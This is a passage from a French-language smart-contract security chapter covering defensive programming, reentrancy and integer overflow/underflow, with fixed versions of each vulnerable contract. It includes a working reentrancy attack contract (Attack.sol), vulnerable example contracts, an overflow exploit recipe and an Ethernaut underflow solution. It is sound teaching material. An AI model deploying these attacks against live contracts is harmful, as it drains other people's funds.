<p>Comme avec d&#8217;autres programmes, un contrat intelligent exécutera exactement ce qui est écrit, ce qui n&#8217;est pas toujours ce que le programmeur avait prévu. De plus, tous les contrats intelligents sont publics et tout utilisateur peut interagir avec eux simplement en créant une transaction. Toute vulnérabilité peut être exploitée et les pertes sont presque toujours impossibles à récupérer. Il est donc essentiel de suivre les meilleures pratiques et d&#8217;utiliser des modèles de conception éprouvés.</p>
</div>
<div class="sect2">
<h3 id="_meilleures_pratiques_de_sécurité">Meilleures pratiques de sécurité</h3>
<div class="paragraph">
<p><em>La programmation défensive</em> est un style de programmation particulièrement bien adapté aux contrats intelligents. Il met l&#8217;accent sur les éléments suivants, qui sont tous des pratiques exemplaires :</p>
</div>
<div class="dlist">
<dl>
<dt class="hdlist1">Minimalisme/simplicité</dt>
<dd>
<p>La complexité est l&#8217;ennemie de la sécurité. Plus le code est simple et moins il en fait, moins il y a de chances qu&#8217;un bogue ou un effet imprévu se produise. Lorsqu&#8217;ils s&#8217;engagent pour la première fois dans la programmation de contrats intelligents, les développeurs sont souvent tentés d&#8217;essayer d&#8217;écrire beaucoup de code. Au lieu de cela, vous devriez parcourir votre code de contrat intelligent et essayer de trouver des moyens d&#8217;en faire moins, avec moins de lignes de code, moins de complexité et moins de "fonctionnalités". Si quelqu&#8217;un vous dit que son projet a produit "des milliers de lignes de code" pour ses contrats intelligents, vous devez vous interroger sur la sécurité de ce projet. Plus simple est plus sûr.</p>
</dd>
<dt class="hdlist1">Réutilisation du code</dt>
<dd>
<p>Essayez de ne pas réinventer la roue. S&#8217;il existe déjà une bibliothèque ou un contrat qui fait la plupart de ce dont vous avez besoin, réutilisez-le. Dans votre propre code, suivez le principe DRY (Don&#8217;t Repeat Yourself) : ne vous répétez pas. Si vous voyez un extrait de code répété plus d&#8217;une fois, demandez-vous s&#8217;il pourrait être écrit en tant que fonction ou bibliothèque et réutilisé. Le code qui a été largement utilisé et testé est probablement plus sécurisé que tout nouveau code que vous écrivez. Méfiez-vous du syndrome "Pas inventé ici", où vous êtes tenté d'"améliorer" une fonctionnalité ou un composant en le construisant à partir de zéro. Le risque de sécurité est souvent supérieur à la valeur d&#8217;amélioration.</p>
</dd>
<dt class="hdlist1">Qualité du code</dt>
<dd>
<p>Le code de contrat intelligent est impitoyable. Chaque bogue peut entraîner une perte monétaire. Vous ne devez pas traiter la programmation de contrats intelligents de la même manière que la programmation à usage général. Écrire des DApps dans Solidity n&#8217;est pas comme créer un widget Web en JavaScript. Vous devez plutôt appliquer des méthodologies d&#8217;ingénierie et de développement de logiciels rigoureuses, comme vous le feriez dans l&#8217;ingénierie aérospatiale ou dans toute discipline similairement impitoyable. Une fois que vous avez "lancé" votre code, vous ne pouvez pas faire grand-chose pour résoudre les problèmes.</p>
</dd>
<dt class="hdlist1">Lisibilité/auditabilité</dt>
<dd>
<p>Votre code doit être clair et facile à comprendre. Plus c&#8217;est facile à lire, plus c&#8217;est facile à auditer. Les contrats intelligents sont publics, car tout le monde peut lire le code intermédiaire et tout le monde peut le désosser. Par conséquent, il est avantageux de développer votre travail en public, en utilisant des méthodologies collaboratives et à source libre, pour tirer parti de la sagesse collective de la communauté des développeurs et bénéficier du plus grand dénominateur commun du développement à source libre. Vous devez écrire un code bien documenté et facile à lire, en suivant les conventions de style et de nommage qui font partie de la communauté Ethereum.</p>
</dd>
<dt class="hdlist1">Couverture de test</dt>
<dd>
<p>Testez tout ce que vous pouvez. Les contrats intelligents s&#8217;exécutent dans un environnement d&#8217;exécution public, où n&#8217;importe qui peut les exécuter avec la contribution de son choix. Vous ne devez jamais supposer que l&#8217;entrée, telle que les arguments de fonction, est bien formée, correctement délimitée ou a un objectif bénin. Testez tous les arguments pour vous assurer qu&#8217;ils se situent dans les plages attendues et qu&#8217;ils sont correctement formatés avant d&#8217;autoriser la poursuite de l&#8217;exécution de votre code.</p>
</dd>
</dl>
</div>
</div>
<div class="sect2">
<h3 id="_risques_de_sécurité_et_anti_modèles">Risques de sécurité et anti-modèles</h3>
<div class="paragraph">
<p>En tant que programmeur de contrats intelligents, vous devez être familiarisé avec les risques de sécurité les plus courants, afin de pouvoir détecter et éviter les modèles de programmation qui exposent vos contrats à ces risques. Dans les sections suivantes, nous examinerons différents risques de sécurité, des exemples de la façon dont les vulnérabilités peuvent survenir et des contre-mesures ou des solutions préventives qui peuvent être utilisées pour y faire face.</p>
</div>
</div>
<div class="sect2">
<h3 id="reentrancy_security">Réentrance</h3>
<div class="paragraph">
<p>L&#8217;une des caractéristiques des contrats intelligents Ethereum est leur capacité à appeler et à utiliser le code d&#8217;autres contrats externes. Les contrats gèrent également généralement l&#8217;ether et, en tant que tels, envoient souvent de l&#8217;ether à diverses adresses d&#8217;utilisateurs externes. Ces opérations nécessitent que les contrats soumettent des appels externes. Ces appels externes peuvent être détournés par des attaquants, qui peuvent forcer les contrats à exécuter du code supplémentaire (via une fonction de secours ), y compris des rappels vers eux-mêmes. Des attaques de ce type ont été utilisées dans le tristement célèbre <a href="http://bit.ly/2DamSZT">piratage DAO</a> .</p>
</div>
<div class="paragraph">
<p>Pour en savoir plus sur les attaques par réentrance , voir <a href="http://bit.ly/2zaqSEY">l&#8217;article de blog</a> de Gus Guimareas sur le sujet et les <a href="http://bit.ly/2ERDMxV">meilleures pratiques pour les contrats intelligents Ethereum</a>.</p>
</div>
<div class="sect3 notoc">
<h4 id="_la_vulnérabilité">La vulnérabilité</h4>
<div class="paragraph">
<p>Ce type d&#8217;attaque peut se produire lorsqu&#8217;un contrat envoie de l&#8217;ether à une adresse inconnue. Un attaquant peut soigneusement construire un contrat à une adresse externe qui contient du code malveillant dans la fonction de secours. Ainsi, lorsqu&#8217;un contrat envoie de l&#8217;ether à cette adresse, il invoquera le code malveillant. Généralement , le code malveillant exécute une fonction sur le contrat vulnérable, effectuant des opérations non prévues par le développeur. Le terme « réentrance » vient du fait que le contrat externe malveillant appelle une fonction sur le contrat vulnérable et que le chemin d&#8217;exécution du code le « <em>réintègre</em> ». Pour clarifier cela, considérons le simple contrat vulnérable dans <a href="#etherstore_vulnerable">EtherStore.sol</a> , qui agit comme un coffre-fort Ethereum qui permet aux déposants de retirer seulement 1 ether par semaine.</p>
</div>
<div id="etherstore_vulnerable" class="exampleblock">
<div class="title">Example 1. EtherStore.sol</div>
<div class="content">
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">contract EtherStore {

    uint256 public withdrawalLimit = 1 ether;
    mapping(address =&gt; uint256) public lastWithdrawTime;
    mapping(address =&gt; uint256) public balances;

    function depositFunds() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds (uint256 _weiToWithdraw) public {
        require(balances[msg.sender] &gt;= _weiToWithdraw);
        // limite le retrait
        require(_weiToWithdraw &lt;= withdrawalLimit);
        // limite le temps accordé pour se rétracter
        require(now &gt;= lastWithdrawTime[msg.sender] + 1 weeks);
        require(msg.sender.call.value(_weiToWithdraw)());
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = now;
    }
 }</code></pre>
</div>
</div>
</div>
</div>
<div class="paragraph">
<p>Ce contrat a deux fonctions publiques, <code>depositFunds</code> et <code>removeFunds</code>. La fonction de dépôt de fonds incrémente simplement le solde de l&#8217;expéditeur. La fonction de retrait de fonds permet à l&#8217;expéditeur de spécifier le montant de wei à retirer. Cette fonction est destinée à réussir uniquement si le montant demandé à retirer est inférieur à 1 ether et qu&#8217;aucun retrait n&#8217;a eu lieu la semaine dernière.</p>
</div>
<div class="paragraph">
<p>La vulnérabilité se trouve à la ligne 17, où le contrat envoie à l&#8217;utilisateur la quantité d&#8217;ether demandée. Considérez un attaquant qui a créé le contrat dans <a href="#etherstore_attack">Attack.sol</a> .</p>
</div>
<div id="etherstore_attack" class="exampleblock">
<div class="title">Example 2. Attack.sol</div>
<div class="content">
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">import "EtherStore.sol";

contract Attack {
  EtherStore public etherStore;

  // initialise la variable etherStore avec l'adresse du contrat
  constructor(address _etherStoreAddress) {
      etherStore = EtherStore(_etherStoreAddress);
  }

  function attackEtherStore() external payable {
      // attaque à l'ether le plus proche
      require(msg.value &gt;= 1 ether);
      // envoie eth à la fonction depositFunds()
      etherStore.depositFunds.value(1 ether)();
      // début de magie
      etherStore.withdrawFunds(1 ether);
  }

  function collectEther() public {
      msg.sender.transfer(this.balance);
  }

  // fonction de secours - où la magie opère
  function () payable {
      if (etherStore.balance &gt; 1 ether) {
          etherStore.withdrawFunds(1 ether);
      }
  }
}</code></pre>
</div>
</div>
</div>
</div>
<div class="paragraph">
<p>Comment l&#8217;exploit peut-il se produire ? Tout d&#8217;abord, l&#8217;attaquant créerait le contrat malveillant (disons à l&#8217;adresse <code>0x0&#8230;&#8203;123</code>) avec l' adresse de contrat de l' <code>EtherStore</code> comme seul paramètre constructeur. Cela initialiserait et pointerait la variable publique <code>etherStore</code> vers le contrat à attaquer.</p>
</div>
<div class="paragraph">
<p>L&#8217;attaquant appellerait alors la fonction <code>attackEtherStore</code> , avec une certaine quantité d&#8217;ether supérieure ou égale à 1 - supposons <code>1 ether</code> pour le moment. Dans cet exemple, nous supposerons également qu&#8217;un certain nombre d&#8217;autres utilisateurs ont déposé de l&#8217;ether dans ce contrat, de sorte que son solde actuel est de <code>10 ether</code>. La suite sera alors ainsi :</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p><em>Attack.sol</em> , ligne 15 : La fonction <code>DepositFunds</code> du contrat <code>EtherStore</code> sera appelée avec un <code>msg.value</code> de <code>1 ether</code> (et beaucoup de gaz). L&#8217;expéditeur (<code>msg.sender</code>) sera le contrat malveillant ( <code>0x0&#8230;&#8203;​123</code> ). Ainsi , <code>balances[0x0&#8230;&#8203;123] = 1 ether</code>.</p>
</li>
<li>
<p><em>Attack.sol</em> , ligne 17 : Le contrat malveillant va alors appeler la fonction <code>withdrawFunds</code> du contrat <code>EtherStore</code> avec un paramètre de <code>1 ether</code> . Cela satisfera à toutes les exigences (lignes 12 à 16 du contrat <code>EtherStore</code> ) car aucun retrait précédent n&#8217;a été effectué.</p>
</li>
<li>
<p><em>EtherStore.sol</em> , ligne 17 : Le contrat renverra <code>1 ether</code> au <span class="keep-together">contrat</span> malveillant.</p>
</li>
<li>
<p><em>Attack.sol</em> , ligne 25 : Le paiement au contrat malveillant exécutera alors la fonction de secours.</p>
</li>
<li>
<p><em>Attack.sol</em> , ligne 26 : Le solde total du contrat EtherStore était de <code>10 ether</code> et est maintenant de <code>9 ether</code> , donc cette instruction if passe.</p>
</li>
<li>
<p><em>Attack.sol</em> , ligne 27 : La fonction de secours appelle de l' <code>EtherStore</code> la fonction <code>withdrawFunds</code> à nouveau et « réintègre » le contrat <code>EtherStore</code> .</p>
</li>
<li>
<p><em>EtherStore.sol</em> , ligne 11 : Dans ce deuxième appel à <code>withdrawFunds</code> , le solde du contrat attaquant est toujours de <code>1 ether</code> car la ligne 18 n&#8217;a pas encore été exécutée. Ainsi, nous avons toujours <code>balances[0x0&#8230;&#8203;123] = 1 ether</code> . C&#8217;est également le cas pour la variable <code>lastWithdrawTime</code> . Encore une fois , nous passons toutes les exigences .</p>
</li>
<li>
<p><em>EtherStore.sol</em> , ligne 17 : Le contrat attaquant retire un autre <code>1 ether</code> .</p>
</li>
<li>
<p>Répétez les étapes 4 à 8 jusqu&#8217;à ce qu&#8217;il ne soit plus le cas que <code>EtherStore.balance &gt; 1</code> , comme dicté par la ligne 26 dans <em>Attack.sol</em> .</p>
</li>
<li>
<p><em>Attack.sol</em> , ligne 26 : Une fois qu&#8217;il reste 1 (ou moins) d&#8217;ether dans le contrat <code>EtherStore</code> , cette instruction <code>if</code> échouera. Cela permettra alors d&#8217;exécuter les lignes 18 et 19 du contrat <code>EtherStore</code> (pour chaque appel à la fonction <code>withdrawFunds</code>).</p>
</li>
<li>
<p><em>EtherStore.sol</em> , lignes 18 et 19 : Les mappages <code>balances</code> et <code>lastWithdrawTime</code> seront définis et l&#8217;exécution se terminera.</p>
</li>
</ol>
</div>
<div class="paragraph">
<p>Le résultat final est que l&#8217;attaquant a retiré tous les ethers sauf 1 du contrat <code>EtherStore</code> en une seule transaction.</p>
</div>
</div>
<div class="sect3 notoc">
<h4 id="_techniques_préventives">Techniques préventives</h4>
<div class="paragraph">
<p>Il existe un certain nombre de techniques courantes qui permettent d&#8217;éviter les vulnérabilités potentielles de réentrance dans les contrats intelligents. La première consiste à (dans la mesure du possible) utiliser la fonction de <a href="http://bit.ly/2Ogvnng">transfert</a> intégrée lors de l&#8217;envoi d&#8217;ether à des contrats externes. La fonction de transfert n&#8217;envoie que 2300 gaz avec l&#8217;appel externe, ce qui n&#8217;est pas suffisant pour que l&#8217;adresse/le contrat de destination appelle un autre contrat (c&#8217;est-à-dire qu&#8217;il ressaisisse le contrat d&#8217;envoi).</p>
</div>
<div class="paragraph">
<p>La deuxième technique consiste à s&#8217;assurer que toute la logique qui modifie les variables d&#8217;état se produit avant que l&#8217;ether ne soit envoyé hors du contrat (ou de tout appel externe). Dans l' exemple <code>EtherStore</code>, les lignes 18 et 19 de <em>EtherStore.sol</em> doivent être placées avant la ligne 17. Il est recommandé que tout code effectuant des appels externes à des adresses inconnues soit la dernière opération d&#8217;une fonction localisée ou d&#8217;un morceau de code exécuté. C&#8217;est ce qu&#8217;on appelle le <a href="http://bit.ly/2EVo70v">modèle vérifications-effets-interactions</a> .</p>
</div>
<div class="paragraph">
<p>Une troisième technique consiste à introduire un mutex, c&#8217;est-à-dire à ajouter une variable d&#8217;état qui verrouille le contrat pendant l&#8217;exécution du code, empêchant les appels réentrants .</p>
</div>
<div class="paragraph">
<p>L&#8217;application de toutes ces techniques (l&#8217;utilisation des trois n&#8217;est pas nécessaire, mais nous le faisons à des fins de démonstration) à <em>EtherStore.sol</em> donne le contrat sans réentrance :</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">contract EtherStore {

    // initialise le mutex
    bool reEntrancyMutex = false;
    uint256 public withdrawalLimit = 1 ether;
    mapping(address =&gt; uint256) public lastWithdrawTime;
    mapping(address =&gt; uint256) public balances;

    function depositFunds() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds (uint256 _weiToWithdraw) public {
        require(!reEntrancyMutex);
        require(balances[msg.sender] &gt;= _weiToWithdraw);
        // limite le retrait
        require(_weiToWithdraw &lt;= withdrawalLimit);
        // limite le temps accordé pour se rétracter
        require(now &gt;= lastWithdrawTime[msg.sender] + 1 weeks);
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = now;
        // définit le mutex de réentrance avant l'appel externe
        reEntrancyMutex = true;
        msg.sender.transfer(_weiToWithdraw);
        // libère le mutex après l'appel externe
        reEntrancyMutex = false;
    }
 }</code></pre>
</div>
</div>
</div>
<div class="sect3">
<h4 id="real_world_example_the_dao">Exemple concret : le DAO</h4>
<div class="paragraph">
<p>L&#8217;attaque DAO (Decentralized Autonomous Organization) a été l&#8217;un des principaux piratages survenus au début du développement d&#8217;Ethereum. À l&#8217;époque, le contrat détenait plus de 150 millions de dollars. La réentrance a joué un rôle majeur dans l&#8217;attaque, qui a finalement conduit à l&#8217;embranchement divergent (hard fork) qui a créé Ethereum Classic (ETC). Pour une bonne analyse de l&#8217;exploit DAO, voir <a href="http://bit.ly/2EQaLCI">http://bit.ly/2EQaLCI</a> . Plus d&#8217;informations sur l&#8217;historique des embranchements d&#8217;Ethereum, la chronologie du piratage DAO et la naissance d&#8217;ETC dans un embranchement divergent peuvent être trouvées dans <a href="#ethereum_standards">[ethereum_standards]</a>.</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_dépassement_et_soupassement_arithmétique">Dépassement et soupassement arithmétique</h3>
<div class="paragraph">
<p>La machine virtuelle Ethereum spécifie des types de données de taille fixe pour les entiers. Cela signifie qu&#8217;une variable entière ne peut représenter qu&#8217;une certaine plage de nombres. Un uint8 , par exemple, ne peut stocker que des nombres dans la plage [0,255]. Essayer de stocker 256 dans un uint8 donnera 0 . Si l&#8217;on n&#8217;y prend pas garde, les variables de Solidity peuvent être exploitées si la saisie de l&#8217;utilisateur n&#8217;est pas cochée et si des calculs sont effectués qui aboutissent à des nombres qui se situent en dehors de la plage du type de données qui les stocke.</p>
</div>
<div class="paragraph">
<p>Pour en savoir plus sur les débordements arithmétiques, voir <a href="https://bit.ly/2nNLuOr">"Comment sécuriser vos contrats intelligents"</a> , <a href="https://bit.ly/2MOfBPv">Ethereum Smart Contract Best Practices</a> et <a href="https://bit.ly/2xvbx1M">"Ethereum, Solidity and integer overflows: Programming blockchains like 1970"</a> .</p>
</div>
<div class="sect3 notoc">
<h4 id="_la_vulnérabilité_2">La vulnérabilité</h4>
<div class="paragraph">
<p>Un dépassement/soupassement se produit lorsqu&#8217;une opération effectuée nécessite une variable de taille fixe pour stocker un nombre (ou un élément de données) qui est en dehors de la plage du type de données de la variable.</p>
</div>
<div class="paragraph">
<p>Par exemple, soustraire <code>1</code> d&#8217;une variable <code>uint8</code> (entier non signé de 8 bits, c&#8217;est-à-dire non négatif) dont la valeur est <code>0</code> donnera le nombre <code>255</code> . Il s&#8217;agit d&#8217;un <em>soupassement</em> . Nous avons attribué un nombre en dessous de la plage de <code>uint8</code> , de sorte que le résultat <em>est une boucle</em> et donne le plus grand nombre qu&#8217;un <code>uint8</code> puisse stocker. De même, ajouter <code>2^8=256</code> à un <code>uint8</code> laissera la variable inchangée, car nous avons enroulé autour de toute la longueur du <code>uint</code> . Deux analogies simples de ce comportement sont les odomètres dans les voitures, qui mesurent la distance parcourue (ils se réinitialisent à 000000, après que le plus grand nombre, c&#8217;est-à-dire 999999, est dépassé) et les fonctions mathématiques périodiques (l&#8217;ajout de 2 π à l&#8217;argument de sin laisse la valeur inchangée ).</p>
</div>
<div class="paragraph">
<p>L&#8217;ajout de nombres supérieurs à la plage du type de données est appelé un <em>dépassement</em> . Pour plus de clarté, ajouter <code>257</code> à un <code>uint8</code> qui a actuellement une valeur de <code>0</code> se traduira par le nombre <code>1</code> . Il est parfois instructif de considérer les variables de taille fixe comme étant cycliques, où nous recommençons à partir de zéro si nous ajoutons des nombres au-dessus du plus grand nombre stocké possible, et commençons à compter à partir du plus grand nombre si nous soustrayons de zéro. Dans le cas des types <code>int</code> signés , qui <em>peuvent</em> représenter des nombres négatifs, nous recommençons une fois que nous atteignons la plus grande valeur négative; par exemple, si nous essayons de soustraire <code>1</code> à un <code>int8</code> dont la valeur est <code>-128</code> , nous obtiendrons <code>127</code> .</p>
</div>
<div class="paragraph">
<p>Ces types de pièges numériques permettent aux attaquants de mal utiliser le code et de créer des flux logiques inattendus. Par exemple, considérez le contrat TimeLock dans  <a href="#timelock_sol_security">TimeLock.sol</a>.</p>
</div>
<div id="timelock_sol_security" class="exampleblock">
<div class="title">Example 3. TimeLock.sol</div>
<div class="content">
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">contract TimeLock {

    mapping(address =&gt; uint) public balances;
    mapping(address =&gt; uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = now + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] &gt; 0);
        require(now &gt; lockTime[msg.sender]);
        balances[msg.sender] = 0;
        msg.sender.transfer(balance);
    }
}</code></pre>
</div>
</div>
</div>
</div>
<div class="paragraph">
<p>Ce contrat est conçu pour agir comme un coffre-fort temporel : les utilisateurs peuvent déposer de l&#8217;ether dans le contrat et il y sera verrouillé pendant au moins une semaine. L&#8217;utilisateur peut prolonger le temps d&#8217;attente à plus d&#8217;une semaine s&#8217;il le souhaite, mais une fois déposé, l&#8217;utilisateur peut être sûr que son ether est verrouillé en toute sécurité pendant au moins une semaine, du moins c&#8217;est ce que prévoit ce contrat.</p>
</div>
<div class="paragraph">
<p>Dans le cas où un utilisateur est obligé de remettre sa clé privée, un contrat comme celui-ci peut être utile pour s&#8217;assurer que son ether est introuvable pendant une courte période. Mais si un utilisateur avait verrouillé <code>100 ether</code> dans ce contrat et remis ses clés à un attaquant, l&#8217;attaquant pourrait utiliser un dépassement pour recevoir l&#8217;ether, quel que soit le <code>lockTime</code>.</p>
</div>
<div class="paragraph">
<p>L&#8217;attaquant pourrait déterminer le <code>lockTime</code> actuel pour l&#8217;adresse pour laquelle il détient maintenant la clé (c&#8217;est une variable publique). Appelons le <code>userLockTime</code> . Ils pourraient alors appeler la fonction <code>increaseLockTime</code> et passer en argument le nombre <code>2^256 - userLockTime</code> . Ce nombre serait ajouté à l' <code>userLockTime</code> actuel et provoquerait un dépassement, réinitialisant <code>lockTime[msg.sender]</code> à <code>0</code>. L&#8217;attaquant pourrait alors simplement appeler la fonction <code>withdraw</code> pour obtenir sa récompense.</p>
</div>
<div class="paragraph">
<p>Regardons un autre exemple (<a href="#underflow_vulnerability_example_from_ethernaut_challenge">Underflow vulnerability example from Ethernaut challenge</a>), celui des <a href="https://github.com/OpenZeppelin/ethernaut">défis Ethernaut</a>.</p>
</div>
<div class="paragraph">
<p><strong>ALERTE DIVULGATION:</strong> <em>Si vous n&#8217;avez pas encore fait les défis Ethernaut, cela donne une solution à l&#8217;un des niveaux</em> .</p>
</div>
<div id="underflow_vulnerability_example_from_ethernaut_challenge" class="exampleblock">
<div class="title">Example 4. Underflow vulnerability example from Ethernaut challenge</div>
<div class="content">
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">pragma solidity ^0.4.18;

contract Token {

  mapping(address =&gt; uint) balances;
  uint public totalSupply;

  function Token(uint _initialSupply) {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value &gt;= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public constant returns (uint balance) {
    return balances[_owner];
  }
}</code></pre>
</div>
</div>
</div>
</div>
<div class="paragraph">
<p>Il s&#8217;agit d&#8217;un simple contrat de jeton qui utilise une fonction de <code>transfer</code> , permettant aux participants de déplacer leurs jetons. Pouvez-vous voir l&#8217;erreur dans ce contrat ?</p>
</div>
<div class="paragraph">
<p>La faille vient de la fonction <code>transfer</code>. L&#8217;instruction require de la ligne 13 peut être contournée à l&#8217;aide d&#8217;un soupassement. Considérez un utilisateur avec un solde nul. Il pourrait appeler la fonction <code>transfer</code> avec n&#8217;importe quelle <code>_value</code> différente de zéro et passer l&#8217;instruction require à la ligne 13. En effet, <code>balances[msg.sender]</code> est égal à <code>0</code> (et un <code>uint256</code> ), donc la soustraction de tout montant positif (à l&#8217;exception de <code>2^256</code> ) entraînera un nombre positif, comme décrit précédemment. Ceci est également vrai pour la ligne 14, où le solde sera crédité d&#8217;un nombre positif. Ainsi, dans cet exemple, un attaquant peut obtenir des jetons gratuits en raison d&#8217;une vulnérabilité de soupassement.</p>
</div>
</div>
<div class="sect3 notoc">
<h4 id="_techniques_préventives_2">Techniques préventives</h4>
<div class="paragraph">
<p>La technique conventionnelle actuelle pour se prémunir contre les vulnérabilités de soupassement/dépassement consiste à utiliser ou à créer des bibliothèques mathématiques qui remplacent les opérateurs mathématiques standard d' addition, de soustraction et de multiplication (la division est exclue car elle ne provoque pas de soupassement/dépassement et l&#8217;EVM revient à la division par 0 ).</p>
</div>
<div class="paragraph">
<p><a href="https://github.com/OpenZeppelin/openzeppelin-solidity">OpenZeppelin</a> a fait un excellent travail de création et d&#8217;audit de bibliothèques sécurisées pour la communauté Ethereum. En particulier, la <a href="http://bit.ly/2ABhb4l">bibliothèque SafeMath</a> peut être utilisée pour éviter les vulnérabilités de soupassement/dépassement.</p>
</div>
<div class="paragraph">
<p>Pour montrer comment ces bibliothèques sont utilisées dans Solidity, corrigeons le contrat <code>TimeLock</code> à l&#8217;aide de la bibliothèque <code>SafeMath</code>. La version sans dépassement du contrat est :</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">library SafeMath {

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert( b &gt; 0); // Solidity relance automatiquement lors de la division par 0
    uint256 c = a / b;
    // assert( a == b * c + a % b); // Cela vaut dans tous les cas
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b &lt;= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c &gt;= a);
    return c;
  }
}

contract TimeLock {
    using SafeMath for uint; // utiliser la bibliothèque pour le type uint
    mapping(address =&gt; uint256) public balances;
    mapping(address =&gt; uint256) public lockTime;

    function deposit() external payable {
        balances[msg.sender] = balances[msg.sender].add(msg.value);
        lockTime[msg.sender] = now.add(1 weeks);
    }

    function increaseLockTime(uint256 _secondsToIncrease) public {
        lockTime[msg.sender] = lockTime[msg.sender].add(_secondsToIncrease);
    }

    function withdraw() public {
        require(balances[msg.sender] &gt; 0);
        require(now &gt; lockTime[msg.sender]);
        balances[msg.sender] = 0;
        msg.sender.transfer(balance);
    }
}</code></pre>
</div>
</div>
<div class="paragraph">
<p>Notez que toutes les opérations mathématiques standard ont été remplacées par celles définies dans la bibliothèque <code>SafeMath</code>. Le contrat <code>TimeLock</code> n&#8217;effectue plus aucune opération capable de soupassement/dépassement.</p>
</div>
</div>
<div class="sect3">
<h4 id="_exemples_concrets_powhc_et_dépassement_de_transfert_par_lots_cve_201810299">Exemples concrets : PoWHC et dépassement de transfert par lots (CVE-2018–10299)</h4>
<div class="paragraph">
<p>Proof of Weak Hands Coin ( PoWHC ), conçu à l&#8217;origine comme une sorte de blague, était un stratagème de Ponzi écrit par un collectif Internet. Malheureusement , il semble que l&#8217;auteur ou les auteurs du contrat n&#8217;avaient pas vu de soupassement/dépassement auparavant, et par conséquent 866 ethers ont été libérés de son contrat. Eric Banisadr donne un bon aperçu de la façon dont le dépassement s&#8217;est produit (ce qui n&#8217;est pas trop différent du défi Ethernaut décrit précédemment) dans son <a href="https://bit.ly/2wrxIFJ">article de blog</a> sur l&#8217;événement.</p>
</div>
<div class="paragraph">
<p><a href="http://bit.ly/2CUf7WG">Un autre exemple</a> provient de l&#8217;implémentation d&#8217;une fonction <code>batchTransfer()</code> dans un groupe de contrats de jetons ERC20. L&#8217;implémentation contenait une vulnérabilité de dépassement; vous pouvez lire les détails dans le <a href="https://bit.ly/2HDlIs8">compte rendu de PeckShield</a>.</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_ether_inattendu">Ether inattendu</h3>
<div class="paragraph">
<p>En règle générale, lorsque de l&#8217;ether est envoyé à un contrat, il doit exécuter soit la fonction de secours, soit une autre fonction définie dans le contrat. Il y a deux exceptions à cela, où l&#8217;ether peut exister dans un contrat sans avoir exécuté de code. Les contrats qui reposent sur l&#8217;exécution de code pour tout l&#8217;ether qui leur est envoyé peuvent être vulnérables aux attaques où l&#8217;ether est envoyé de force.</p>
</div>
<div class="paragraph">
<p>Pour en savoir plus à ce sujet, consultez <a href="https://bit.ly/2MR8Gp0">« Comment sécuriser vos contrats intelligents »</a> et <a href="http://bit.ly/2RjXmUWl">« Modèles de sécurité solides – Forcer Ether à un contrat »</a> .</p>
</div>
<div class="sect3 notoc">
<h4 id="_la_vulnérabilité_3">La vulnérabilité</h4>
<div class="paragraph">
<p>Une technique de programmation défensive courante qui est utile pour appliquer des transitions d&#8217;état correctes ou valider des opérations est <em>la vérification invariante</em> . Cette technique consiste à définir un ensemble d&#8217;invariants (métriques ou paramètres qui ne doivent pas changer) et à vérifier qu&#8217;ils restent inchangés après une (ou plusieurs) opération(s). C&#8217;est généralement une bonne conception, à condition que les invariants vérifiés soient en fait des invariants. Un exemple d&#8217;invariant est <code>totalSupply</code> d&#8217;une émission fixe de <a href="http://bit.ly/2CUf7WG">Jeton ERC20</a> . Comme aucune fonction ne doit modifier cet invariant, on pourrait ajouter une vérification à la fonction <code>transfer</code> qui s&#8217;assure que le <code>totalSupply</code> reste inchangé, pour garantir que la fonction fonctionne comme prévu.</p>
</div>
<div class="paragraph">
<p>En particulier, il existe un invariant apparent qu&#8217;il peut être tentant d&#8217;utiliser mais qui peut en fait être manipulé par des utilisateurs externes (quelles que soient les règles mises en place dans le contrat intelligent). Il s&#8217;agit de l&#8217;ether actuel stocké dans le contrat. Souvent, lorsque les développeurs apprennent Solidity pour la première fois , ils ont l&#8217;idée fausse qu&#8217;un contrat ne peut accepter ou obtenir de l&#8217;ether que via des fonctions payantes. Cette idée fausse peut conduire à des contrats qui contiennent de fausses hypothèses sur l&#8217;équilibre de l&#8217;ether, ce qui peut entraîner une série de vulnérabilités. La preuve irréfutable de cette vulnérabilité est l&#8217;utilisation (incorrecte) de <code>this.balance</code>.</p>
</div>
<div class="paragraph">
<p>Il existe deux manières d&#8217;envoyer (de force) de l&#8217;ether à un contrat sans utiliser de fonction payante ni exécuter de code sur le contrat :</p>
</div>
<div class="dlist">
<dl>
<dt class="hdlist1">Autodestruction/suicide</dt>
<dd>
